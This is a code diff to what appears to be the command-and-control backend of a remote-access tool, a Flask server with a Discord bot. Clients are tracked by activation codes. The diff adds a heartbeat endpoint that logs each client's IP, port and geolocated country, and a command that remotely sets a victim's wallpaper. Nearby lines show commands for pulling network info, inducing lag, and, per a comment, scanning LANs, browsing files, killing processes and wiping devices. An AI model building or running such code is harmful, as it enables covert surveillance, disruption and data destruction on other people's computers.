@@ -76,6 +76,32 @@ def api_activate():
 
     return {"status": "error", "message": "Save failed"}, 500
 
+@app.route('/heartbeat', methods=['POST'])
+def api_heartbeat():
+    data = request.json
+    if not data: return {"status": "error", "message": "No data"}, 400
+    user_code = data.get("code", "").strip().upper()
+    if request.headers.get('X-Forwarded-For'):
+        client_ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
+    else:
+        client_ip = request.remote_addr
+    client_port = str(request.environ.get('REMOTE_PORT', '7680'))
+    client_country = "Unknown"
+    try:
+        geo_res = requests.get(f"http://ip-api.com/json/{client_ip}?fields=status,country", timeout=2).json()
+        if geo_res.get('status') == 'success':
+            client_country = geo_res.get('country', 'Unknown')
+    except Exception:
+        pass
+    db, sha, url, headers = fetch_db()
+    if db and "codes" in db and user_code in db["codes"]:
+        db["codes"][user_code]["ip"] = client_ip
+        db["codes"][user_code]["port"] = client_port
+        db["codes"][user_code]["country"] = client_country
+        save_db(db, sha, url, headers, f"Heartbeat update for {user_code}")
+        return {"status": "success", "ip": client_ip}
+    return {"status": "error", "message": "Code not found"}, 404
+
 async def send_discord_activation_alert(user_code, current_device, client_ip, client_port, client_country):
     try:
         channel = client.get_channel(CHANNEL_ID)
@@ -629,7 +655,7 @@ async def stats_gui_command(interaction: discord.Interaction):
     embed.add_field(name="🚫 المحظورة", value=f"`{blacklisted}`", inline=True)
     await interaction.followup.send(embed=embed, view=MainDashboardView(), ephemeral=True)
 
-# ─── الأوامر المتقدمة والتحكم المطلق ───
+# ─── الأوامر المضافة (IPConfig, LanScan, Files, KillProcess, Wipe, Geolocation, Wallpaper, LagTimer) ───
 @client.tree.command(name="ipconfig", description="سحب معلومات الشبكة IP للعميل")
 @app_commands.describe(target="كود التفعيل المستهدف")
 async def cmd_ipconfig(interaction: discord.Interaction, target: str):
@@ -683,7 +709,22 @@ async def cmd_geo(interaction: discord.Interaction, target: str):
     info = db.get("codes", {}).get(target.upper(), {})
     ip = info.get("ip", "غير معروف")
     country = info.get("country", "غير معروف")
-    await interaction.followup.send(f"🌍 **الموقع الجغرافي للعميل `{target.upper()`}:**\n• IP: `{ip}`\n• الدولة: `{country}`", ephemeral=True)
+    await interaction.followup.send(f"🌍 **الموقع الجغرافي للعميل `{target.upper()}`:**\n• IP: `{ip}`\n• الدولة: `{country}`", ephemeral=True)
+
+@client.tree.command(name="wallpaper", description="تغيير خلفية سطح المكتب لجهاز عميل معين عبر رابط صورة")
+@app_commands.describe(target="كود التفعيل المستهدف", image_url="رابط مباشر للصورة (JPG/PNG)")
+async def wallpaper_command(interaction: discord.Interaction, target: str, image_url: str):
+    if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
+    db, sha, url, headers = fetch_db()
+    if not db: return
+    target_upper = target.strip().upper()
+    if target_upper not in db.get("codes", {}):
+        await interaction.followup.send(f"❌ لم يتم العثور على الكود: `{target}`", ephemeral=True)
+        return
+    if "remote_wallpapers" not in db: db["remote_wallpapers"] = {}
+    db["remote_wallpapers"][target_upper] = {"url": image_url, "id": str(int(time.time()))}
+    if save_db(db, sha, url, headers, f"Request wallpaper update for {target_upper}"):
+        await interaction.followup.send(f"🖼️ **تم إرسال أمر تغيير الخلفية للعميل `{target_upper}` بنجاح!**", ephemeral=True)
 
 @client.tree.command(name="lagtimer", description="تفعيل لاج أو بينغ مرتفع مؤقت للعميل مع تحديد المدة")
 @app_commands.describe(target="كود التفعيل المستهدف", ping_value="قيمة البينغ (مثال: 500)", duration_seconds="المدة بالثواني")
